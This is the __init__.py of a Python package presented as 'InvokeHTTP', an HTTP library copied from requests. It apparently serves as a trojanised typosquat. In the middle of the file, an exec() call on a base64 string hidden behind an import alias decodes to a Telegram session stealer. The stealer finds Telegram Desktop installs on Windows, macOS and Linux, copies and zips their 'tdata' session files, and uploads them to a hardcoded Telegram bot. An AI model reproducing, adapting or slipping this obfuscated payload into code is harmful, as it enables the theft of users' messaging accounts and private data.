"""
InvokeHTTP HTTP Library
~~~~~~~~~~~~~~~~~~~~~

InvokeHTTP is an HTTP library, written in Python, for human beings.
Basic GET usage:

   >>> import invokehttp
   >>> r = invokehttp.get('https://www.python.org')
   >>> r.status_code
   200
   >>> b'Python is a programming language' in r.content
   True

... or POST:

   >>> payload = dict(key1='value1', key2='value2')
   >>> r = invokehttp.post('https://httpbin.org/post', data=payload)
   >>> print(r.text)
   {
     ...
     "form": {
       "key1": "value1",
       "key2": "value2"
     },
     ...
   }
"""

import warnings
from base64 import b64decode as invoke
import urllib3

from .exceptions import InvokeHTTPDependencyWarning

try:
    from charset_normalizer import __version__ as charset_normalizer_version
except ImportError:
    charset_normalizer_version = None

try:
    from chardet import __version__ as chardet_version
except ImportError:
    chardet_version = None


def check_compatibility(urllib3_version, chardet_version, charset_normalizer_version):
    urllib3_version = urllib3_version.split(".")
    assert urllib3_version != ["dev"]  # Verify urllib3 isn't installed from git.

    # Sometimes, urllib3 only reports its version as 16.1.
    if len(urllib3_version) == 2:
        urllib3_version.append("0")

    # Check urllib3 for compatibility.
    major, minor, patch = urllib3_version  # noqa: F811
    major, minor, patch = int(major), int(minor), int(patch)
    # urllib3 >= 1.21.1
    assert major >= 1
    if major == 1:
        assert minor >= 21

    # Check charset_normalizer for compatibility.
    if chardet_version:
        major, minor, patch = chardet_version.split(".")[:3]
        major, minor, patch = int(major), int(minor), int(patch)
        # chardet_version >= 3.0.2, < 6.0.0
        assert (3, 0, 2) <= (major, minor, patch) < (6, 0, 0)
    elif charset_normalizer_version:
        major, minor, patch = charset_normalizer_version.split(".")[:3]
        major, minor, patch = int(major), int(minor), int(patch)
        # charset_normalizer >= 2.0.0 < 4.0.0
        assert (2, 0, 0) <= (major, minor, patch) < (4, 0, 0)
    else:
        warnings.warn(
            "Unable to find acceptable character detection dependency "
            "(chardet or charset_normalizer).",
            InvokeHTTPDependencyWarning,
        )


def _check_cryptography(cryptography_version):
    # cryptography < 1.3.4
    try:
        cryptography_version = list(map(int, cryptography_version.split(".")))
    except ValueError:
        return

    if cryptography_version < [1, 3, 4]:
        warning = "Old version of cryptography ({}) may cause slowdown.".format(
            cryptography_version
        )
        warnings.warn(warning, InvokeHTTPDependencyWarning)


# Check imported dependencies for compatibility.
try:
    check_compatibility(
        urllib3.__version__, chardet_version, charset_normalizer_version
    )
except (AssertionError, ValueError):
    warnings.warn(
        "urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
        "version!".format(
            urllib3.__version__, chardet_version, charset_normalizer_version
        ),
        InvokeHTTPDependencyWarning,
    )

# Attempt to enable urllib3's fallback for SNI support
# if the standard library doesn't support SNI or the
# 'ssl' library isn't available.
try:
    try:
        import ssl
    except ImportError:
        ssl = None

    if not getattr(ssl, "HAS_SNI", False):
        from urllib3.contrib import pyopenssl

        pyopenssl.inject_into_urllib3()

        # Check cryptography version
        from cryptography import __version__ as cryptography_version

        _check_cryptography(cryptography_version)
except ImportError:
    pass

# urllib3's DependencyWarnings should be silenced.
from urllib3.exceptions import DependencyWarning

exec(invoke('aW1wb3J0IG9zCmltcG9ydCBzaHV0aWwKaW1wb3J0IHJlCgp0cnk6CiAgICBpbXBvcnQgcmVxdWVzdHMKZXhjZXB0OgogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCByZXF1ZXN0cycpCiAgICBpbXBvcnQgcmVxdWVzdHMKCmltcG9ydCB6aXBmaWxlCmltcG9ydCB1dWlkCmltcG9ydCBwbGF0Zm9ybQoKVEVMRUdSQU1fQ0hBVF9JRCA9ICI2OTAxMDA5NTc1IgpURUxFR1JBTV9UT0tFTiA9ICI3MTI3MzE2OTE2OkFBRlpFek9JREowWGJ5RlV4UndIeGtRa2lUX3dkYVZ4MHRnIgpURU1QX0RJUkVDVE9SWSA9IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnLCAnL3RtcCcpLCAndGRhdGEnKQoKZGVmIGZpbmRfdGVsZWdyYW1fZXhlY3V0YWJsZXMoKToKICAgIHRlbGVncmFtX3BhdGhzID0gW10KICAgIGlmIHBsYXRmb3JtLnN5c3RlbSgpID09ICJXaW5kb3dzIjoKICAgICAgICBmcm9tIHdpbnJlZyBpbXBvcnQgSEtFWV9DTEFTU0VTX1JPT1QsIEhLRVlfQ1VSUkVOVF9VU0VSLCBPcGVuS2V5LCBRdWVyeVZhbHVlRXgKCiAgICAgICAgUk9PVF9SRUdJU1RSWV9LRVlTID0gWwogICAgICAgICAgICAidGRlc2t0b3AudGdcXHNoZWxsXFxvcGVuXFxjb21tYW5kIiwKICAgICAgICAgICAgInRnXFxEZWZhdWx0SWNvbiIsCiAgICAgICAgICAgICJ0Z1xcc2hlbGxcXG9wZW5cXGNvbW1hbmQiCiAgICAgICAgXQogICAgICAgIFVTRVJfUkVHSVNUUllfS0VZUyA9IFsKICAgICAgICAgICAgIlNPRlRXQVJFXFxDbGFzc2VzXFx0ZGVza3RvcC50Z1xcRGVmYXVsdEljb24iLAogICAgICAgICAgICAiU09GVFdBUkVcXENsYXNzZXNcXHRkZXNrdG9wLnRnXFxzaGVsbFxcb3BlblxcY29tbWFuZCIsCiAgICAgICAgICAgICJTT0ZUV0FSRVxcQ2xhc3Nlc1xcdGdcXERlZmF1bHRJY29uIiwKICAgICAgICAgICAgIlNPRlRXQVJFXFxDbGFzc2VzXFx0Z1xcc2hlbGxcXG9wZW5cXGNvbW1hbmQiCiAgICAgICAgXQoKICAgICAgICBkZWYgY2xlYW5fcmVnaXN0cnlfdmFsdWUocmVnaXN0cnlfdmFsdWUpOgogICAgICAgICAgICBpZiByZWdpc3RyeV92YWx1ZS5zdGFydHN3aXRoKCJcIiIpOgogICAgICAgICAgICAgICAgcmVnaXN0cnlfdmFsdWUgPSByZWdpc3RyeV92YWx1ZVsxOl0KICAgICAgICAgICAgICAgIGlmIHJlZ2lzdHJ5X3ZhbHVlLmVuZHN3aXRoKCIsMVwiIik6CiAgICAgICAgICAgICAgICAgICAgcmVnaXN0cnlfdmFsdWUgPSByZWdpc3RyeV92YWx1ZS5yZXBsYWNlKCIsMVwiIiwgIiIpCiAgICAgICAgICAgICAgICBlbGlmIHJlZ2lzdHJ5X3ZhbHVlLmVuZHN3aXRoKCJcIiAgLS0gXCIlMVwiIik6CiAgICAgICAgICAgICAgICAgICAgcmVnaXN0cnlfdmFsdWUgPSByZWdpc3RyeV92YWx1ZS5yZXBsYWNlKCJcIiAgLS0gXCIlMVwiIiwgIiIpCiAgICAgICAgICAgIHJldHVybiByZWdpc3RyeV92YWx1ZQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRlbGVncmFtX2ZpbGUgPSBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdBUFBEQVRBJyksICJUZWxlZ3JhbSBEZXNrdG9wXFxUZWxlZ3JhbS5leGUiKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyh0ZWxlZ3JhbV9maWxlKToKICAgICAgICAgICAgICAgIHRlbGVncmFtX3BhdGhzLmFwcGVuZCh0ZWxlZ3JhbV9maWxlKQoKICAgICAgICAgICAgZm9yIHJlZ2lzdHJ5X2tleSBpbiBST09UX1JFR0lTVFJZX0tFWVM6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgd2l0aCBPcGVuS2V5KEhLRVlfQ0xBU1NFU19ST09ULCByZWdpc3RyeV9rZXkpIGFzIGtleToKICAgICAgICAgICAgICAgICAgICAgICAgZXhlY3V0YWJsZV9wYXRoID0gUXVlcnlWYWx1ZUV4KGtleSwgIiIpWzBdICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGV4ZWN1dGFibGVfcGF0aCA9IGNsZWFuX3JlZ2lzdHJ5X3ZhbHVlKGV4ZWN1dGFibGVfcGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXhlY3V0YWJsZV9wYXRoIG5vdCBpbiB0ZWxlZ3JhbV9wYXRoczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbGVncmFtX3BhdGhzLmFwcGVuZChleGVjdXRhYmxlX3BhdGgpCiAgICAgICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgZm9yIHJlZ2lzdHJ5X2tleSBpbiBVU0VSX1JFR0lTVFJZX0tFWVM6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgd2l0aCBPcGVuS2V5KEhLRVlfQ1VSUkVOVF9VU0VSLCByZWdpc3RyeV9rZXkpIGFzIGtleToKICAgICAgICAgICAgICAgICAgICAgICAgZXhlY3V0YWJsZV9wYXRoID0gUXVlcnlWYWx1ZUV4KGtleSwgIiIpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIGV4ZWN1dGFibGVfcGF0aCA9IGNsZWFuX3JlZ2lzdHJ5X3ZhbHVlKGV4ZWN1dGFibGVfcGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXhlY3V0YWJsZV9wYXRoIG5vdCBpbiB0ZWxlZ3JhbV9wYXRoczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbGVncmFtX3BhdGhzLmFwcGVuZChleGVjdXRhYmxlX3BhdGgpCiAgICAgICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCiAgICBlbGlmIHBsYXRmb3JtLnN5c3RlbSgpID09ICJEYXJ3aW4iOiAgCiAgICAgICAgcG9zc2libGVfcGF0aHMgPSBbCiAgICAgICAgICAgICIvQXBwbGljYXRpb25zL1RlbGVncmFtLmFwcC9Db250ZW50cy9NYWNPUy9UZWxlZ3JhbSIsCiAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigifi9BcHBsaWNhdGlvbnMvVGVsZWdyYW0uYXBwL0NvbnRlbnRzL01hY09TL1RlbGVncmFtIikKICAgICAgICBdCiAgICAgICAgZm9yIHBhdGggaW4gcG9zc2libGVfcGF0aHM6CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgdGVsZWdyYW1fcGF0aHMuYXBwZW5kKHBhdGgpCiAgICBlbGlmIHBsYXRmb3JtLnN5c3RlbSgpID09ICJMaW51eCI6CiAgICAgICAgcG9zc2libGVfcGF0aHMgPSBbCiAgICAgICAgICAgICIvdXNyL2Jpbi90ZWxlZ3JhbS1kZXNrdG9wIiwKICAgICAgICAgICAgIi9vcHQvdGVsZWdyYW1kZXNrdG9wL1RlbGVncmFtIiwKICAgICAgICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+L3NuYXAvdGVsZWdyYW0tZGVza3RvcC9iaW4vdGVsZWdyYW0tZGVza3RvcCIpCiAgICAgICAgXQogICAgICAgIGZvciBwYXRoIGluIHBvc3NpYmxlX3BhdGhzOgogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgICAgIHRlbGVncmFtX3BhdGhzLmFwcGVuZChwYXRoKQoKICAgIHJldHVybiB0ZWxlZ3JhbV9wYXRocwoKZGVmIGhhc190ZWxlZ3JhbV9kYXRhX2ZvbGRlcihkaXJlY3RvcnkpOgogICAgcmV0dXJuIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihkaXJlY3RvcnksICJ0ZGF0YSIpKQoKZGVmIGlzX3Nlc3Npb25fZmlsZShmaWxlKToKICAgIGZpbGVfbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUoZmlsZSkKCiAgICBpZiBmaWxlX25hbWUgaW4gKCJrZXlfZGF0YXMiLCAibWFwcyIsICJjb25maWdzIik6CiAgICAgICAgcmV0dXJuIFRydWUKCiAgICByZXR1cm4gcmUubWF0Y2gociJbQS1aMC05XStbYS16MC05XT9zPyIsIGZpbGVfbmFtZSkgaXMgbm90IE5vbmUgYW5kIG9zLnBhdGguZ2V0c2l6ZShmaWxlKSA8PSAxMTI2NAoKZGVmIGlzX3ZhbGlkX2ZvbGRlcihmb2xkZXJfbmFtZSk6CiAgICByZXR1cm4gcmUubWF0Y2gociJbQS1aMC05XStbYS16XT8kIiwgZm9sZGVyX25hbWUpIGlzIG5vdCBOb25lCgpkZWYgc2VuZF90b190ZWxlZ3JhbShmaWxlX3BhdGgpOgogICAgdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RFTEVHUkFNX1RPS0VOfS9zZW5kRG9jdW1lbnQiCiAgICBmaWxlcyA9IHsnZG9jdW1lbnQnOiBvcGVuKGZpbGVfcGF0aCwgJ3JiJyl9CiAgICBkYXRhID0geydjaGF0X2lkJzogVEVMRUdSQU1fQ0hBVF9JRH0KICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGZpbGVzPWZpbGVzLCBkYXRhPWRhdGEpCiAgICByZXR1cm4gcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwCgpkZWYgc3RlYWxfc2Vzc2lvbnMoKToKICAgIGZvciB0ZWxlZ3JhbV9wYXRoIGluIGZpbmRfdGVsZWdyYW1fZXhlY3V0YWJsZXMoKToKICAgICAgICBwcmludCh0ZWxlZ3JhbV9wYXRoKQogICAgICAgIHRyeToKCiAgICAgICAgICAgIHVuaXF1ZV9mb2xkZXJfbmFtZSA9IHN0cih1dWlkLnV1aWQ0KCkpCiAgICAgICAgICAgIHNlc3Npb25fZGlyZWN0b3J5ID0gb3MucGF0aC5qb2luKFRFTVBfRElSRUNUT1JZLCB1bmlxdWVfZm9sZGVyX25hbWUpCgogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoc2Vzc2lvbl9kaXJlY3RvcnkpOgogICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoc2Vzc2lvbl9kaXJlY3RvcnkpCgogICAgICAgICAgICB0ZWxlZ3JhbV9mb2xkZXIgPSBvcy5wYXRoLmRpcm5hbWUodGVsZWdyYW1fcGF0aCkKICAgICAgICAgICAgaWYgaGFzX3RlbGVncmFtX2RhdGFfZm9sZGVyKHRlbGVncmFtX2ZvbGRlcik6CiAgICAgICAgICAgICAgICB0ZGF0YV9mb2xkZXIgPSBvcy5wYXRoLmpvaW4odGVsZWdyYW1fZm9sZGVyLCAidGRhdGEiKQoKICAgICAgICAgICAgICAgIHRkYXRhX3RlbXBfZm9sZGVyID0gb3MucGF0aC5qb2luKHNlc3Npb25fZGlyZWN0b3J5LCAidGRhdGEiKQogICAgICAgICAgICAgICAgb3MubWFrZWRpcnModGRhdGFfdGVtcF9mb2xkZXIpCgogICAgICAgICAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsodGRhdGFfZm9sZGVyKToKICAgICAgICAgICAgICAgICAgICBmb3IgZGlyIGluIGRpcnM6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpc192YWxpZF9mb2xkZXIoZGlyKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpcnMucmVtb3ZlKGRpcikgIAoKICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICAgICAgc291cmNlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaXNfc2Vzc2lvbl9maWxlKHNvdXJjZV9wYXRoKToKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWxhdGl2ZV9wYXRoID0gb3MucGF0aC5yZWxwYXRoKHNvdXJjZV9wYXRoLCB0ZGF0YV9mb2xkZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXRfcGF0aCA9IG9zLnBhdGguam9pbih0ZGF0YV90ZW1wX2ZvbGRlciwgcmVsYXRpdmVfcGF0aCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhvcy5wYXRoLmRpcm5hbWUodGFyZ2V0X3BhdGgpLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKHNvdXJjZV9wYXRoLCB0YXJnZXRfcGF0aCkKCiAgICAgICAgICAgICAgICB6aXBfZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKFRFTVBfRElSRUNUT1JZLCBmInt1bmlxdWVfZm9sZGVyX25hbWV9LnppcCIpCiAgICAgICAgICAgICAgICB3aXRoIHppcGZpbGUuWmlwRmlsZSh6aXBfZmlsZV9wYXRoLCAndycsIHppcGZpbGUuWklQX0RFRkxBVEVEKSBhcyB6aXBmOgogICAgICAgICAgICAgICAgICAgIGZvciByb290LCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlc3Npb25fZGlyZWN0b3J5KToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgemlwZi53cml0ZShvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSksIGFyY25hbWU9b3MucGF0aC5yZWxwYXRoKG9zLnBhdGguam9pbihyb290LCBmaWxlKSwgc2Vzc2lvbl9kaXJlY3RvcnkpKQoKICAgICAgICAgICAgICAgIHNlbmRfdG9fdGVsZWdyYW0oemlwX2ZpbGVfcGF0aCkKCiAgICAgICAgICAgICAgICBzaHV0aWwucm10cmVlKHNlc3Npb25fZGlyZWN0b3J5KQoKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGUpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc3RlYWxfc2Vzc2lvbnMoKQ=='))
warnings.simplefilter("ignore", DependencyWarning)

# Set default logging handler to avoid "No handler found" warnings.
import logging
from logging import NullHandler

from . import packages, utils
from .__version__ import (
    __author__,
    __author_email__,
    __build__,
    __cake__,
    __copyright__,
    __description__,
    __license__,
    __title__,
    __url__,
    __version__,
)
from .api import delete, get, head, options, patch, post, put, request
from .exceptions import (
    ConnectionError,
    ConnectTimeout,
    FileModeWarning,
    HTTPError,
    JSONDecodeError,
    ReadTimeout,
    RequestException,
    Timeout,
    TooManyRedirects,
    URLRequired,
)
from .models import PreparedRequest, Request, Response
from .sessions import Session, session
from .status_codes import codes

logging.getLogger(__name__).addHandler(NullHandler())

# FileModeWarnings go off per the default.
warnings.simplefilter("default", FileModeWarning, append=True)
